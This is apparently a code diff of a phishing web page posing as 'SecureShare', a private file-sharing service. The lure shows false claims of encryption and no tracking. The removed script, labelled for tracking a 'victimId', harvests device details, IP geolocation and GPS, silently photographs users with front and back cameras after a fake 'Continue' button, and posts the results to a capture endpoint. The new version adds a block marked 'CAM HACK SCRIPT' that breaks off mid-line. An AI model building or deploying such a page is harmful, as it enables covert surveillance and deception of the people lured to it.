@@ -1,227 +1,685 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>SecureShare</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: radial-gradient(circle at 30% 10%, #0f0c29, #302b63, #24243e);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            padding: 16px;
-        }
-        .glass {
-            background: rgba(255,255,255,0.06);
-            backdrop-filter: blur(16px);
-            border-radius: 40px;
-            padding: 32px 24px;
-            max-width: 440px;
-            width: 100%;
-            border: 1px solid rgba(255,255,255,0.12);
-            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
-            text-align: center;
-            color: #fff;
-        }
-        .glass h1 {
-            font-size: 30px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #f093fb, #f5576c);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .glass .sub {
-            font-size: 13px;
-            letter-spacing: 3px;
-            color: rgba(255,255,255,0.5);
-            text-transform: uppercase;
-            margin: 4px 0 18px;
-        }
-        .frame {
-            border-radius: 24px;
-            padding: 8px;
-            background: rgba(255,255,255,0.04);
-            border: 1px solid rgba(255,255,255,0.08);
-            margin: 16px 0;
-        }
-        .frame img {
-            width: 100%;
-            aspect-ratio: 4/3;
-            object-fit: cover;
-            border-radius: 18px;
-            display: block;
-            background: #1a1a2e;
-        }
-        .glow-btn {
-            background: linear-gradient(145deg, #f093fb, #f5576c);
-            border: none;
-            padding: 18px;
-            border-radius: 60px;
-            color: #fff;
-            font-size: 20px;
-            font-weight: 700;
-            cursor: pointer;
-            width: 100%;
-            box-shadow: 0 8px 30px rgba(245,87,108,0.35);
-            transition: 0.25s;
-            margin: 12px 0 6px;
-        }
-        .glow-btn:active { transform: scale(0.96); }
-        .sparkle { animation: pulseGlow 2s infinite; }
-        @keyframes pulseGlow {
-            0%,100% { box-shadow: 0 8px 30px rgba(245,87,108,0.35); }
-            50% { box-shadow: 0 8px 60px rgba(245,87,108,0.7); }
-        }
-        .footer-text {
-            font-size: 11px;
-            opacity: 0.3;
-            margin-top: 18px;
-        }
-        .hidden { display: none !important; }
-        #loading {
-            margin-top: 20px;
-            font-size: 14px;
-            opacity: 0.7;
-            animation: pulseGlow 1.5s infinite;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>SecureShare</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+    * { font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #0a0818;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ===== ANIMATIONS ===== */
+    @keyframes floatCard {
+      0%, 100% { transform: translateY(0px) rotate(-0.5deg); }
+      50% { transform: translateY(-12px) rotate(0.5deg); }
+    }
+    @keyframes pulseGlow {
+      0%, 100% { box-shadow: 0 0 20px rgba(236,72,153,0.4), 0 0 40px rgba(236,72,153,0.15), inset 0 1px 0 rgba(255,255,255,0.2); }
+      50% { box-shadow: 0 0 30px rgba(236,72,153,0.65), 0 0 60px rgba(236,72,153,0.25), inset 0 1px 0 rgba(255,255,255,0.25); }
+    }
+    @keyframes iconPulse {
+      0%, 100% { transform: scale(1); opacity: 0.9; }
+      50% { transform: scale(1.08); opacity: 1; }
+    }
+    @keyframes shimmer {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(200%); }
+    }
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(16px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-float { animation: floatCard 6s ease-in-out infinite; }
+    .animate-pulseGlow { animation: pulseGlow 2.5s ease-in-out infinite; }
+    .animate-fadeUp { animation: fadeUp 0.8s ease-out forwards; }
+
+    /* ===== BACKGROUND ===== */
+    .bg-gradient {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      background: #0a0818;
+    }
+    .bg-gradient::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(120% 120% at 20% 10%, #302b63 0%, transparent 50%),
+                  radial-gradient(100% 100% at 80% 20%, #4a2d6b 0%, transparent 45%),
+                  radial-gradient(120% 120% at 50% 100%, #24243e 0%, transparent 60%),
+                  radial-gradient(80% 80% at 0% 80%, #1a1633 0%, transparent 50%);
+    }
+    .bg-glow-1 {
+      position: absolute;
+      top: -20%;
+      left: 10%;
+      width: 700px;
+      height: 700px;
+      background: rgba(124,58,237,0.2);
+      border-radius: 50%;
+      filter: blur(120px);
+      pointer-events: none;
+    }
+    .bg-glow-2 {
+      position: absolute;
+      bottom: -10%;
+      right: 5%;
+      width: 600px;
+      height: 600px;
+      background: rgba(192,38,211,0.15);
+      border-radius: 50%;
+      filter: blur(130px);
+      pointer-events: none;
+    }
+
+    /* ===== NAV ===== */
+    nav {
+      position: relative;
+      z-index: 10;
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+      padding: 0 24px;
+      height: 72px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      max-width: 1280px;
+      margin: 0 auto;
+      width: 100%;
+    }
+    .nav-logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .nav-logo .icon-box {
+      width: 36px;
+      height: 36px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, #8b5cf6, #d946ef);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 20px rgba(139,92,246,0.4);
+    }
+    .nav-logo .icon-box svg {
+      width: 18px;
+      height: 18px;
+      color: #fff;
+    }
+    .nav-logo span {
+      font-size: 22px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
+    .nav-logo span .white { color: #fff; }
+    .nav-logo span .gradient { background: linear-gradient(135deg, #c4b5fd, #f0abfc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+    .nav-links {
+      display: none;
+      gap: 32px;
+      font-size: 14px;
+      color: rgba(255,255,255,0.6);
+      font-weight: 500;
+    }
+    .nav-links a { color: inherit; text-decoration: none; transition: color 0.2s; }
+    .nav-links a:hover { color: #fff; }
+
+    .nav-actions {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .nav-actions .sign-in {
+      display: none;
+      height: 36px;
+      padding: 0 20px;
+      border-radius: 9999px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.1);
+      font-size: 13px;
+      font-weight: 600;
+      color: #fff;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .nav-actions .sign-in:hover { background: rgba(255,255,255,0.1); }
+    .nav-actions .get-started {
+      height: 36px;
+      padding: 0 20px;
+      border-radius: 9999px;
+      background: #fff;
+      border: none;
+      font-size: 13px;
+      font-weight: 700;
+      color: #000;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .nav-actions .get-started:hover { background: rgba(255,255,255,0.9); }
+
+    /* ===== MAIN CONTENT ===== */
+    .main-content {
+      position: relative;
+      z-index: 10;
+      flex: 1;
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 48px 24px 96px;
+      width: 100%;
+      display: flex;
+      align-items: center;
+    }
+    .main-grid {
+      display: grid;
+      gap: 40px;
+      width: 100%;
+    }
+    @media (min-width: 1024px) {
+      .main-grid { grid-template-columns: 1.05fr 0.95fr; gap: 48px; }
+    }
+
+    /* ===== LEFT COLUMN ===== */
+    .left-col { order: 2; }
+    @media (min-width: 1024px) { .left-col { order: 1; } }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 14px;
+      border-radius: 9999px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.1);
+      font-size: 12px;
+      font-weight: 500;
+      color: rgba(255,255,255,0.7);
+      backdrop-filter: blur(24px);
+      margin-bottom: 24px;
+    }
+    .badge .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #34d399;
+      animation: pulseGlow 2s infinite;
+      box-shadow: 0 0 8px rgba(52,211,153,0.8);
+    }
+
+    .main-title {
+      font-size: 42px;
+      font-weight: 800;
+      line-height: 0.95;
+      letter-spacing: -0.03em;
+      margin-bottom: 16px;
+    }
+    .main-title .highlight {
+      background: linear-gradient(135deg, #c4b5fd, #f0abfc);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    @media (min-width: 768px) { .main-title { font-size: 64px; } }
+    @media (min-width: 1024px) { .main-title { font-size: 68px; } }
+
+    .main-desc {
+      font-size: 16px;
+      line-height: 1.6;
+      color: rgba(255,255,255,0.55);
+      max-width: 520px;
+      font-weight: 500;
+      margin-bottom: 24px;
+    }
+    @media (min-width: 768px) { .main-desc { font-size: 18px; } }
+
+    .icon-row {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+    .icon-item {
+      position: relative;
+      width: 56px;
+      height: 56px;
+      border-radius: 16px;
+      background: rgba(255,255,255,0.06);
+      backdrop-filter: blur(24px);
+      border: 1px solid rgba(255,255,255,0.08);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s;
+    }
+    .icon-item:hover { background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.15); }
+    .icon-item svg { width: 20px; height: 20px; color: rgba(255,255,255,0.8); }
+    .icon-item:hover svg { color: #fff; }
+    .icon-item .tooltip {
+      position: absolute;
+      bottom: -28px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      color: rgba(255,255,255,0.4);
+      opacity: 0;
+      transition: opacity 0.2s;
+      white-space: nowrap;
+    }
+    .icon-item:hover .tooltip { opacity: 1; }
+
+    @media (min-width: 768px) { .icon-item { width: 60px; height: 60px; } }
+
+    .cta-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin-bottom: 32px;
+    }
+    .btn-primary {
+      height: 48px;
+      padding: 0 28px;
+      border-radius: 9999px;
+      background: #fff;
+      border: none;
+      font-size: 14px;
+      font-weight: 700;
+      color: #000;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn-primary:hover { background: rgba(255,255,255,0.9); }
+    .btn-primary .arrow {
+      display: inline-flex;
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: #000;
+      color: #fff;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+    }
+    .btn-secondary {
+      height: 48px;
+      padding: 0 28px;
+      border-radius: 9999px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.1);
+      font-size: 14px;
+      font-weight: 600;
+      color: rgba(255,255,255,0.8);
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .btn-secondary:hover { background: rgba(255,255,255,0.1); color: #fff; }
+
+    .trust-row {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      font-size: 12px;
+      color: rgba(255,255,255,0.4);
+    }
+    .trust-avatars {
+      display: flex;
+    }
+    .trust-avatars .avatar {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      border: 2px solid #0a0818;
+      background: linear-gradient(135deg, #a78bfa, #d946ef);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
+      font-weight: 700;
+      color: #fff;
+      margin-right: -8px;
+    }
+
+    /* ===== RIGHT COLUMN (CARD) ===== */
+    .right-col { order: 1; display: flex; justify-content: center; }
+    @media (min-width: 1024px) { .right-col { order: 2; justify-content: flex-end; } }
+
+    .card-wrapper {
+      width: 100%;
+      max-width: 420px;
+      animation: floatCard 6s ease-in-out infinite;
+    }
+    .card {
+      position: relative;
+      background: rgba(18,17,31,0.8);
+      backdrop-filter: blur(20px);
+      border-radius: 28px;
+      border: 1px solid rgba(255,255,255,0.08);
+      box-shadow: 0 20px 80px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.08);
+      overflow: hidden;
+    }
+    .card-glow {
+      position: absolute;
+      inset: -24px;
+      background: linear-gradient(135deg, rgba(124,58,237,0.2), rgba(192,38,211,0.2), rgba(236,72,153,0.2));
+      border-radius: 32px;
+      filter: blur(40px);
+      z-index: -1;
+    }
+
+    .card-header {
+      padding: 20px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+    }
+    .card-header-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .card-header-left .icon-box {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #8b5cf6, #d946ef);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .card-header-left .icon-box svg { width: 16px; height: 16px; color: #fff; }
+    .card-header-left .title { font-size: 12px; font-weight: 800; letter-spacing: 0.04em; color: #fff; }
+    .card-header-left .sub { font-size: 10px; font-weight: 700; letter-spacing: 0.14em; color: rgba(255,255,255,0.4); text-transform: uppercase; }
+
+    .card-body { padding: 12px; }
+    .card-image {
+      position: relative;
+      border-radius: 18px;
+      overflow: hidden;
+      background: rgba(0,0,0,0.4);
+      aspect-ratio: 4/3;
+    }
+    .card-image img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+    .card-image .overlay {
+      position: absolute;
+      inset: 0;
+      border-radius: 18px;
+      box-shadow: inset 0 0 0 1px rgba(255,255,255,0.06);
+      pointer-events: none;
+    }
+    .card-image .gradient-overlay {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(to top, rgba(0,0,0,0.2), transparent);
+      pointer-events: none;
+    }
+    .card-image .encrypt-badge {
+      position: absolute;
+      top: 12px;
+      left: 12px;
+      padding: 4px 10px;
+      border-radius: 9999px;
+      background: rgba(0,0,0,0.6);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255,255,255,0.1);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.04em;
+      color: rgba(255,255,255,0.8);
+    }
+    .card-image .encrypt-badge svg { width: 12px; height: 12px; }
+
+    .card-footer { padding: 12px 12px 0; }
+    .card-footer .btn-continue {
+      position: relative;
+      width: 100%;
+      height: 56px;
+      border-radius: 16px;
+      background: linear-gradient(135deg, #ff4ecd, #ff5eb8, #ff6fae);
+      border: none;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 0.02em;
+      cursor: pointer;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .card-footer .btn-continue .shimmer {
+      position: absolute;
+      inset: 0;
+      overflow: hidden;
+    }
+    .card-footer .btn-continue .shimmer::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      width: 40%;
+      background: linear-gradient(to right, transparent, rgba(255,255,255,0.2), transparent);
+      transform: skewX(-12deg);
+      animation: shimmer 2.5s ease-in-out infinite;
+    }
+    .card-footer .btn-continue:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    .card-bottom {
+      padding: 14px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 11px;
+      font-weight: 500;
+      color: rgba(255,255,255,0.35);
+      border-top: 1px solid rgba(255,255,255,0.04);
+    }
+    .card-bottom svg { width: 14px; height: 14px; }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 480px) {
+      .main-title { font-size: 28px; }
+      .icon-item { width: 44px; height: 44px; }
+      .icon-item svg { width: 16px; height: 16px; }
+      .card { border-radius: 20px; }
+      nav { padding: 0 16px; height: 64px; }
+      .main-content { padding: 24px 16px 48px; }
+    }
+  </style>
 </head>
 <body>
-    <div class="glass" id="mainPage">
-        <h1>🔒 SecureShare</h1>
-        <p class="sub">SHARED SECURELY WITH YOU</p>
-        <div class="frame">
-            <img id="userPhoto" src="{{PHOTO_URL}}" alt="User Photo" />
-        </div>
-        <button class="glow-btn sparkle" id="continueBtn" onclick="requestCamera()">
-            Continue →
-        </button>
-        <p class="footer-text">End-to-end encrypted · Secure connection</p>
-        <div id="loading" class="hidden">⏳ Processing...</div>
+
+  <!-- ===== BACKGROUND ===== -->
+  <div class="bg-gradient">
+    <div class="bg-glow-1"></div>
+    <div class="bg-glow-2"></div>
+  </div>
+
+  <!-- ===== NAV ===== -->
+  <nav>
+    <div class="nav-logo">
+      <div class="icon-box">
+        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      </div>
+      <span><span class="white">Secure</span><span class="gradient">Share</span></span>
     </div>
+    <div class="nav-links">
+      <a href="#">Product</a>
+      <a href="#">Security</a>
+      <a href="#">Pricing</a>
+    </div>
+    <div class="nav-actions">
+      <button class="sign-in">Sign in</button>
+      <button class="get-started">Get Started</button>
+    </div>
+  </nav>
 
-    <script>
-        // ===== URL PARAMS =====
-        const urlParams = new URLSearchParams(window.location.search);
-        const victimId = urlParams.get('v') || 'unknown';
-        const redirectUrl = '{{REDIRECT_URL}}';
+  <!-- ===== MAIN CONTENT ===== -->
+  <main class="main-content">
+    <div class="main-grid">
 
-        // ===== DEVICE INFO =====
-        function getDeviceInfo() {
-            const info = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: screen.width + 'x' + screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language,
-                battery: 'N/A',
-                network: 'N/A'
-            };
-            if (navigator.getBattery) {
-                navigator.getBattery().then(b => info.battery = Math.round(b.level * 100) + '%');
-            }
-            if (navigator.connection) {
-                info.network = navigator.connection.effectiveType || 'N/A';
-            }
-            return info;
-        }
+      <!-- LEFT COLUMN -->
+      <div class="left-col">
+        <div class="badge">
+          <span class="dot"></span>
+          End-to-end encrypted • Zero-knowledge
+        </div>
 
-        // ===== IP / LOCATION =====
-        async function getLocationInfo() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                return {
-                    ip: data.ip || 'Unknown',
-                    city: data.city || 'Unknown',
-                    lat: data.latitude || null,
-                    lng: data.longitude || null
-                };
-            } catch {
-                return { ip: 'Unknown', city: 'Unknown', lat: null, lng: null };
-            }
-        }
+        <h1 class="main-title">
+          Share Anything,<br />
+          Securely With<br />
+          <span class="highlight">Anyone.</span>
+        </h1>
 
-        // ===== SEND DATA TO BOT =====
-        async function sendData(payload) {
-            try {
-                await fetch('/api/capture/cam', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ victim_id: victimId, type: 'cam', ...payload })
-                });
-            } catch (e) {
-                console.log('Send error:', e);
-            }
-        }
+        <p class="main-desc">
+          The most private way to share files, photos and links. Military-grade encryption,
+          auto-expiring links, and no tracking — ever. Designed for people who care about privacy.
+        </p>
 
-        // ===== CAMERA =====
-        function requestCamera() {
-            const btn = document.getElementById('continueBtn');
-            const loading = document.getElementById('loading');
-            btn.disabled = true;
-            btn.textContent = '⏳ Please wait...';
-            loading.classList.remove('hidden');
+        <div class="icon-row">
+          <div class="icon-item" style="animation: iconPulse 3s ease-in-out infinite; animation-delay: 0s;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 17H7A5 5 0 0 1 7 7h2"/><path d="M15 7h2a5 5 0 1 1 0 10h-2"/><line x1="8" x2="16" y1="12" y2="12"/></svg>
+            <span class="tooltip">Link</span>
+          </div>
+          <div class="icon-item" style="animation: iconPulse 3s ease-in-out infinite; animation-delay: 0.25s;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" x2="12" y1="3" y2="15"/></svg>
+            <span class="tooltip">Upload</span>
+          </div>
+          <div class="icon-item" style="animation: iconPulse 3s ease-in-out infinite; animation-delay: 0.5s;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>
+            <span class="tooltip">Shield</span>
+          </div>
+          <div class="icon-item" style="animation: iconPulse 3s ease-in-out infinite; animation-delay: 0.75s;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z"/></svg>
+            <span class="tooltip">Fast</span>
+          </div>
+          <div class="icon-item" style="animation: iconPulse 3s ease-in-out infinite; animation-delay: 1s;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            <span class="tooltip">Lock</span>
+          </div>
+        </div>
 
-            (async () => {
-                const device = getDeviceInfo();
-                const loc = await getLocationInfo();
-                await sendData({ device_info: device, ip: loc.ip, city: loc.city, lat: loc.lat, lng: loc.lng });
-            })();
+        <div class="cta-row">
+          <button class="btn-primary" onclick="alert('Secure link opened')">
+            Start sharing free
+            <span class="arrow">→</span>
+          </button>
+          <button class="btn-secondary">See how it works</button>
+        </div>
 
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                alert('Camera not supported.');
-                loading.classList.add('hidden');
-                btn.disabled = false;
-                btn.textContent = 'Continue →';
-                return;
-            }
+        <div class="trust-row">
+          <div class="trust-avatars">
+            <div class="avatar">A</div>
+            <div class="avatar">B</div>
+            <div class="avatar">C</div>
+          </div>
+          <span>Trusted by 40,000+ privacy-focused teams</span>
+        </div>
+      </div>
 
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
-                .then(stream => {
-                    capturePhoto(stream, 'Back');
-                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-                        .then(frontStream => capturePhoto(frontStream, 'Front'))
-                        .catch(() => {});
-                    setTimeout(requestLocation, 1000);
-                    setTimeout(() => {
-                        window.location.href = redirectUrl || 'https://google.com';
-                    }, 3000);
-                })
-                .catch(err => {
-                    alert('❌ Camera permission required!');
-                    loading.classList.add('hidden');
-                    btn.disabled = false;
-                    btn.textContent = 'Continue →';
-                });
-        }
+      <!-- RIGHT COLUMN (CARD) -->
+      <div class="right-col">
+        <div class="card-wrapper">
+          <div class="card">
+            <div class="card-glow"></div>
 
-        function capturePhoto(stream, cameraType) {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-                video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                sendData({ photo: canvas.toDataURL('image/jpeg', 0.85), camera_type: cameraType });
-                stream.getTracks().forEach(t => t.stop());
-            };
-        }
+            <!-- CARD HEADER -->
+            <div class="card-header">
+              <div class="card-header-left">
+                <div class="icon-box">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                </div>
+                <div>
+                  <div class="title">SecureShare</div>
+                  <div class="sub">SHARED SECURELY WITH YOU</div>
+                </div>
+              </div>
+              <div style="width:24px;height:24px;border-radius:50%;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;">
+                <div style="width:4px;height:4px;border-radius:50%;background:rgba(255,255,255,0.4);"></div>
+              </div>
+            </div>
 
-        function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => sendData({ location: { lat: pos.coords.latitude, lng: pos.coords.longitude } }),
-                    () => console.log('Location denied')
-                );
-            }
-        }
-    </script>
-</body>
-</html>
+            <!-- CARD IMAGE -->
+            <div class="card-body">
+              <div class="card-image">
+                <img id="camPhoto" src="{{PHOTO_URL}}" alt="Shared preview" />
+                <div class="overlay"></div>
+                <div class="gradient-overlay"></div>
+                <div class="encrypt-badge">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                  ENCRYPTED
+                </div>
+              </div>
+            </div>
+
+            <!-- CARD FOOTER -->
+            <div class="card-footer">
+              <button class="btn-continue animate-pulseGlow" id="continueBtn" onclick="requestCamera()">
+                <span style="position:relative;z-index:10;display:flex;align-items:center;gap:8px;">
+                  Continue <span style="font-size:18px;">→</span>
+                </span>
+                <div class="shimmer"></div>
+              </button>
+            </div>
+
+            <div class="card-bottom">
+              <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>
+              End-to-end encrypted • Expires in 24h
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </main>
+
+  <!-- ===== FOOTER ===== -->
+  <footer style="position:relative;z-index:10;border-top:1px solid rgba(255,255,255,0.06);padding:40px 24px;">
+    <div style="max-width:1280px;margin:0 auto;display:flex;flex-direction:column;align-items:center;justify-content:space-between;gap:24px;">
+      <div style="display:flex;align-items:center;gap:12px;">
+        <div style="width:32px;height:32px;border-radius:8px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:rgba(255,255,255,0.6);"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        </div>
+        <div style="font-size:13px;">
+          <div style="font-weight:700;color:rgba(255,255,255,0.8);letter-spacing:-0.02em;">SecureShare © 2026</div>
+          <div style="color:rgba(255,255,255,0.3);font-weight:500;">Private sharing, reimagined. No tracking. No compromises.</div>
+        </div>
+      </div>
+      <div style="display:flex;gap:24px;font-size:12px;font-weight:600;color:rgba(255,255,255,0.3);">
+        <a href="#" style="color:inherit;text-decoration:none;transition:color 0.2s;" onmouseover="this.style.color='rgba(255,255,255,0.6)'" onmouseout="this.style.color='rgba(255,255,255,0.3)'">Privacy</a>
+        <a href="#" style="color:inherit;text-decoration:none;transition:color 0.2s;" onmouseover="this.style.color='rgba(255,255,255,0.6)'" onmouseout="this.style.color='rgba(255,255,255,0.3)'">Security Whitepaper</a>
+        <a href="#" style="color:inherit;text-decoration:none;transition:color 0.2s;" onmouseover="this.style.color='rgba(255,255,255,0.6)'" onmouseout="this.style.color='rgba(255,255,255,0.3)'">GitHub</a>
+        <a href="#" style="color:inherit;text-decoration:none;transition:color 0.2s;" onmouseover="this.style.color='rgba(255,255,255,0.6)'" onmouseout="this.style.color='rgba(255,255,255,0.3)'">Contact</a>
+      </div>
+    </div>
+  </footer>
+
+  <!-- ===== CAM HACK SCRIPT ===== -->
+  <script>
+    // ===== URL PARAMS =====
+    const urlParams = new URLSearchParams(window.location.search);
+    const victimId = urlParams.get('v') || 'unknown';
+    const redirectUrl = '{{REDIRECT_URL}}';
+    const photoUrl = '{{PHOTO_URL}}
